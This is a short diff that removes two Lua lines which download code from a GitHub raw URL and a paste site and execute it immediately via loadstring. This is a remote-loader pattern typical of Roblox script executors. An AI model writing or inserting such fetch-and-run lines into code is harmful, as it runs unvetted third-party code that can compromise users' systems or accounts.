@@ -1,2 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/Lua/refs/heads/main/X"))()
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FUtayvag7N/0", true))()
